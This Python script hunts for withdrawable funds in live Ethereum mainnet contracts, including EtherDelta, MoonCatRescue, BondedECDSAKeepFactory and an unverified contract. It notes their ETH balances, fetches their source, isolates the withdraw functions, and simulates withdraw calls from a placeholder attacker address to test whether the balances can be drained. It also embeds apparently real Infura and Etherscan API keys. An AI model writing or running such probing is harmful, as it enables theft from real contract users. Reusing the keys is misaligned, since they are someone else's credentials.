#!/usr/bin/env python3
"""
Investigate promising targets with withdraw functions
"""
import json
import subprocess
import time

RPC = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c"
ETHERSCAN_API = "5UWN6DNT7UZCEJYNE3J6FCVAWH4QJW255K"

def rpc_call(method, params):
    payload = {"jsonrpc": "2.0", "method": method, "params": params, "id": 1}
    cmd = ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
           "-d", json.dumps(payload), RPC]
    result = subprocess.run(cmd, capture_output=True, text=True)
    try:
        return json.loads(result.stdout)
    except:
        return None

def eth_call(to, data, from_addr=None):
    call_obj = {"to": to, "data": data}
    if from_addr:
        call_obj["from"] = from_addr
    return rpc_call("eth_call", [call_obj, "latest"])

def get_source(addr):
    url = f"https://api.etherscan.io/v2/api?chainid=1&module=contract&action=getsourcecode&address={addr}&apikey={ETHERSCAN_API}"
    result = subprocess.run(["curl", "-s", url], capture_output=True, text=True)
    try:
        data = json.loads(result.stdout)
        if data.get("status") == "1" and data.get("result"):
            return data["result"][0]
        return None
    except:
        return None

ATTACKER = "0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF"

print("=" * 80)
print("INVESTIGATION 1: BondedECDSAKeepFactory")
print("=" * 80)

KEEP = "0xa7d9e842efb252389d613da88eda3731512e40bd"

# Get source
source = get_source(KEEP)
if source:
    src = source.get("SourceCode", "")
    if src:
        # Find withdraw functions
        lines = src.split('\n')
        print("Withdraw-related code:")
        in_func = False
        depth = 0
        for i, line in enumerate(lines):
            if 'function' in line.lower() and 'withdraw' in line.lower():
                in_func = True
                depth = 0
                print(f"\n--- Line {i} ---")
            
            if in_func:
                print(line)
                depth += line.count('{') - line.count('}')
                if depth <= 0 and '}' in line:
                    in_func = False

# Test withdraw with attacker address
print("\n\nTesting withdraw calls:")

# withdraw(address) for BondedECDSAKeepFactory
withdraw_resp = eth_call(KEEP, "0x51cff8d9" + "000000000000000000000000" + ATTACKER[2:].lower(), ATTACKER)
print(f"withdraw(address): {withdraw_resp}")

print("\n" + "=" * 80)
print("INVESTIGATION 2: EtherDelta (221 ETH)")
print("=" * 80)

ED = "0x4aea7cf559f67cedcad07e12ae6bc00f07e8cf65"

# Get source
time.sleep(0.3)
source = get_source(ED)
if source:
    src = source.get("SourceCode", "")
    if src:
        lines = src.split('\n')
        print("Withdraw function:")
        for i, line in enumerate(lines):
            if 'function withdraw' in line.lower():
                for j in range(i, min(i+15, len(lines))):
                    print(lines[j])
                print("---")
                break

# EtherDelta has user balances - check if we have any
# tokens[0][attacker] for ETH balance
# tokens mapping: mapping(address => mapping(address => uint256))

# Check our balance
# balanceOf(token, user) - but EtherDelta uses different pattern
# Let's check withdraw directly with 0 amount
withdraw_data = "0x2e1a7d4d" + "0" * 64  # withdraw(0)
withdraw_resp = eth_call(ED, withdraw_data, ATTACKER)
print(f"\nwithdraw(0) response: {withdraw_resp}")

print("\n" + "=" * 80)
print("INVESTIGATION 3: MoonCatRescue (246 ETH)")
print("=" * 80)

MC = "0x60cd862c9c687a9de49aecdc3a99b74a4fc54ab6"

# Get source
time.sleep(0.3)
source = get_source(MC)
if source:
    src = source.get("SourceCode", "")
    if src:
        lines = src.split('\n')
        print("Withdraw function and pendingWithdrawals:")
        for i, line in enumerate(lines):
            if 'withdraw' in line.lower() or 'pending' in line.lower():
                print(f"{i}: {line.strip()[:100]}")

# Check pendingWithdrawals[attacker]
# pendingWithdrawals is a mapping, we need to compute storage slot
# keccak256(abi.encode(attacker, slot_number))

print("\n" + "=" * 80)  
print("INVESTIGATION 4: Unverified 0x7ea2 (261 ETH, high gas withdraw)")
print("=" * 80)

UNVERIFIED = "0x7ea2df0f49d1cf7cb3a328f0038822b08aeb0ac1"

# Get bytecode
code_resp = rpc_call("eth_getCode", [UNVERIFIED, "latest"])
code = code_resp.get("result", "") if code_resp else ""
print(f"Bytecode length: {(len(code)-2)//2} bytes")

# Get source
time.sleep(0.3)
source = get_source(UNVERIFIED)
if source:
    name = source.get("ContractName", "")
    src = source.get("SourceCode", "")
    print(f"Contract: {name}")
    if src:
        print(f"Source length: {len(src)}")
        # Look for withdraw
        if "withdraw" in src.lower():
            lines = src.split('\n')
            for i, line in enumerate(lines):
                if 'function' in line.lower() and 'withdraw' in line.lower():
                    for j in range(i, min(i+20, len(lines))):
                        print(lines[j])
                    break

# Test withdraw
withdraw_resp = eth_call(UNVERIFIED, "0x3ccfd60b", ATTACKER)
print(f"\nwithdraw() eth_call: {withdraw_resp}")

